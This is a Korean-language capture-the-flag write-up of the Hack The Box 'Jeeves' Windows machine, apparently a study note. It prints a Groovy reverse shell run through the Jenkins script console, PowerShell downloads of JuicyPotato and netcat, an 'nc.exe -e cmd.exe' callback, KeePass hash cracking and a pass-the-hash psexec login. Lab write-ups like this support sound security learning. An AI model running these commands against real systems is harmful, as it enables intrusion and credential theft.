# HTB-JEEVES
```bash
OS: Windows
DATE: 26.09.27
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 검사, UDP 포트 검사까지 진행했다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 80,135,445,50000
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
포트 검사 결과 80, 50000번은 웹 서비스가 작동한다는 것을 알게 되었고, 특히 50000번 포트는 Jetty 9.4.z가 동작 중이라는 것을 알게 되었다. 또한 135, 445 SMB 서비스도 실행 중이었다. 초기 접근을 위해 80번 웹 서비스에 먼저 접속했다. Ask Jeeves라는 웹 서비스가 실행 중이었고 무언가를 검색할 수 있었다. 이후 50000번 포트에도 접속한 결과 페이지는 400 상태 코드가 떴지만 config.xml이라는 파일을 다운로드받을 수 있었다. 일단 두 포트의 웹 서비스 fuzzing과 서브도메인 fuzzing을 진행했다. 또한 기본 워드리스트와 숨긴 파일이 있는 워드리스트를 활용하여 숨긴 파일까지 확인했다.
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://IP -H "Host: FUZZ.jeeves" -fs 503
```
이렇게 80번 포트 검사를 진행했고, 바로 50000번 포트도 검사를 진행했다.
```bash
ffuf -u http://IP/FUZZ:50000 -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -u http://IP/FUZZ:50000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://IP:50000 -H "Host: FUZZ.jeeves:50000" -fs 503
```
검사 결과 50000번 포트에 **/askjeeves**라는 웹 디렉토리가 있다는 것을 알게 되었다. 이후 SMB 포트도 있었기에 익명으로 로그인을 해보았다.
```bash
smbclient -L //IP -N
```
하지만 SMB로는 아무것도 하지 못했다.

## Initial Access
아까 알게 된 50000번 포트 /askjeeves 웹 디렉토리에 들어가보았다. 해당 웹에는 **Jenkins**라는 소프트웨어 개발 과정에서 빌드, 배포 등을 자동화해주는 오픈 소스 자동화 서버 서비스가 실행 중이었다. Jenkins 안에 `script console`이라는 시스템이 있는데, 해당 시스템은 **Groovy**라는 언어를 실행할 수 있는 console이었다. 따라서 구글에 Groovy reverse shell을 검색하여 코드를 만들고 콘솔 안에서 실행했다.
```groovy
Thread.start {
String host="IP";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```
```bash
nc -nlvp 4444
```
따라서 쉘을 얻게 되었다. 하지만 쉘을 처음 접근했을 때 위치는 `C:\Users\Administrator\.jenkins`이었다. 그리고 `cd ../`을 실행해본 결과 **Access is Denied**가 뜨기에 권한이 정말 작은 유저 쉘을 얻은 줄 알았다. 따라서 아까 받은 config.xml 내용을 확인해보니 admin 해시도 있고 여러 가지가 있었다.
```xml
<?xml version='1.0' encoding='UTF-8'?>
<user>
  <fullName>admin</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <apiToken>{AQAAABAAAAAwID3cR3pyZaEkaDPU25Z0S+nrU8+gDgB0JEWORJ5L1P2T+zXc/tSs2IVn1ugWLaui54D6yYki4vhXQtGhqUSeFw==}</apiToken>
    </jenkins.security.ApiTokenProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1509762882255</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```
따라서 관련 내용을 구글에 검색해본 결과, 내가 지금 있는 jenkins 폴더에는 secrets 폴더라는 것이 있다. 그 안에는 master.key와 hudson.util.Secret이 있고, 이것을 꺼내서 jenkins-credentials-decryptor로 복호화할 수 있었다. 그런데 알고 보니 credential.xml 파일이 있어야 크래킹이 가능하다는 것을 알게 되었고, 해당 쉘을 아무리 찾아도 관련 내용을 찾을 수 없었다. 알고 보니 whoami를 쳐본 결과 kohsuke라는 유저였고, `../`만 권한이 없던 것이었다. `../../../`를 통해 admin 폴더를 빠져나오면 Users 폴더 및 일반 권한이 있는 그냥 유저라는 것을 알게 되었다. 엄청난 삽질을 한 것이었다. 뭐가 됐든 유저 쉘을 얻게 되었다.

![user](attach_real/Pasted%20image%2020260927133621.png)

## Privilege Escalation
이 머신은 권한 상승 루트가 2가지 있었다. 첫 번째는 쉘을 얻고 `whoami /all`을 확인해본 결과 **SeImpersonatePrivilege**라는 권한이 있었다. 해당 권한은 다른 사용자를 흉내낼 수 있는 권한이었다. 따라서 **Juicy Potato**라는 도구를 사용하는 것이었다. 이 도구를 쉽게 설명하면 토큰을 낚아채어 활용한 후 SYSTEM이 되는 원리다. 실행 순서는 JuicyPotato.exe 파일과 nc.exe 파일을 서버를 띄워 대상 쉘로 보내주는 것이었다.
```bash
(kali)
python3 -m http.server 80
```
대상 쉘에서는 certutil 명령어가 작동하지 않아 `powershell -c Invoke-WebRequest` 명령어를 사용하여 다운로드받았다.
```ps1
powershell -c "Invoke-WebRequest -Uri http://IP/JuicyPotato.exe -OutFile C:\Users\kohsuke\Desktop\JP.exe"
```
```ps1
powershell -c "Invoke-WebRequest -Uri http://IP/nc.exe -OutFile C:\Users\kohsuke\Desktop\nc.exe"
```
도구를 받은 후 리버스 쉘 페이로드 .bat 파일을 만들어주었다. 따라서 대상 쉘에서 rev.bat이라는 파일을 만들어주었다.
```bat
echo C:\Users\kohsuke\Desktop\nc.exe -e cmd.exe IP 443 > C:\Users\kohsuke\Desktop\rev.bat
```
```Bash
(kali)
nc -nlvp 443
```
이후 JP.exe 파일을 실행해주었다.
```ps1
C:\Users\kohsuke\Desktop\JP.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\kohsuke\Desktop\rev.bat" -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```
이것을 설명하면, -l 옵션은 JP가 가짜 COM 서버를 열 로컬 포트 번호이다. 1337은 예시이다. 이후 -p를 사용하여 실행할 프로그램을 지정하고, -a로 cmd에 넘길 인자를 적어준다. 여기서 /c는 이 명령을 실행하고 바로 종료하라는 뜻이다. 그리고 -t *은 토큰 획득 방식이다. -c 옵션은 CLSID를 설정하는 옵션이다. COM이란 Windows에서 프로그램끼리 서로 기능을 빌려 쓰게 해주는 부품 시스템이다. Windows 안에는 이런 부품(COM 객체)이 수백 개 있다. 왜 COM이 공격에 쓰이냐면, COM 객체들 중 일부는 SYSTEM 권한으로 깨어난다. 시스템 레벨 작업을 해야 하기 때문이다. CLSID는 COM 객체의 주소이다. COM 객체가 수백 개이기 때문에 고유 주소를 찍어줘야 한다. OS 버전마다 존재하는 COM 객체가 다르고 SYSTEM 권한으로 깨어나는 객체도 다르기 때문에, OS에 따라 잘 먹히는 CLSID를 골라야 한다. 따라서 SYSTEM 쉘을 얻을 수 있었다.

또 하나의 방법은 user kohsuke 폴더에서 `tree /F /A`를 사용하여 Documents 폴더에 CEH.kdbx 파일이 있다는 것을 알 수 있었다. 이 파일을 로컬에서 SMB를 열어준 후 로컬로 파일을 옮겨주었다.
```bash
impacket-smbserver share $(pwd) -smb2support
```
```ps1
(target)
copy C:\Users\kohsuke\Documents\CEH.kdbx \\IP\share
```
이후 kdbx 파일을 크래킹하기 위해 **keepass2john**을 사용하여 크래킹할 수 있는 형식으로 변환해주었다.
```bash
keepass2john CEH.kdbx > hash
```
이후 john으로 크랙해주었다.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
크랙 결과 `moonshine1`이라는 마스터 패스워드를 알 수 있게 되었다. 이후 **keepassxc**라는 GUI 툴을 사용하여 DB 내용을 볼 수 있었다.
![image](attach_real/Pasted%20image%2020260928172201.png)
이후 DB를 살펴보던 중 NTLM 해시처럼 생긴 것을 확인할 수 있었다. 따라서 NTLM 해시를 nxc를 이용하여 확인한 결과 admin으로 로그인할 수 있었다.
```bash
nxc smb IP -u Administrator -H NTLM 
```
따라서 psexec 도구를 활용하여 로그인이 가능했다.
```bash
psexec.py Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
쉘을 얻은 후 루트 flag를 확인해보려 한 결과 이곳에 없다는 메시지만 있고 다른 폴더를 뒤져야 나온다는 것을 알게 되었다. 그래서 `dir /R` 옵션을 활용해 숨겨진 파일을 볼 수 있는 옵션을 추가하여 확인한 결과 ADS 형식의 **hm.txt:root.txt:$DATA**라는 파일을 확인할 수 있었다. ADS는 NTFS 파일 시스템에서 하나의 파일에 여러 개의 데이터 스트림을 붙일 수 있는 기능이다. 우리가 보통 보는 파일은 기본 스트림이다. 거기에 추가로 숨겨진 스트림을 붙일 수 있는 게 ADS이다. 따라서 ADS를 읽기 위해 more을 사용했다. `파일명:스트림명`
```bash
more < hm.txt:root.txt
```
따라서 루트 플래그를 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020260927151921.png)

## New Inform
- 절대 FUZZING이 끝나기 전에 판단하지 말아라.
- 쉘을 잡자마자 내가 누구인지부터 확인하자.
- SeImpersonatePrivilege: 이름 그대로 다른 사용자를 흉내낼 수 있는 권한. 원래 목적은 서비스 계정이 클라이언트를 대신해서 작업할 때 필요한 권한이다.
- Juicy Potato는 인자 파싱 문제 때문에 .bat을 만들어 사용해야 한다.
- .bat: 배치 파일. Windows의 명령어들을 미리 적어둔 텍스트 파일.
- tree 명령어에서 그냥 tree만 치면 폴더 구조만 보여준다. 파일을 보여주지 않기 때문에 /F 옵션을 추가해야 파일까지 표시된다. /A 옵션은 ASCII 문자로 그리는 것으로, 더 시각적으로 볼 수 있다.
- impacket-smbserver 도구로 SMB 파일 서버를 임시로 띄울 수 있다. 공유 이름을 적어주고 공유할 폴더를 적어주면 된다.
- 쉘을 따면 다른 폴더들도 잘 뒤져보자. tree 딸깍 ㄱㄱ
- NTLM에서 NT 부분만이 아니라 LM도 같이 넣어도 상관없다.
- psexec로 hash 로그인 할 때 -hashes 옵션으로 가능.
- ADS: NTFS 파일 시스템에서 하나의 파일에 숨겨서 붙일 수 있는 두 번째(이상의) 데이터 스트림. 형식은 `파일명:스트림명`.
- more은 텍스트를 화면에 보여주는 도구이다. type은 인자를 제대로 처리하지 못하기 때문에 `more < 파일` 이런 식으로 사용해야 ADS 파일을 출력할 수 있다.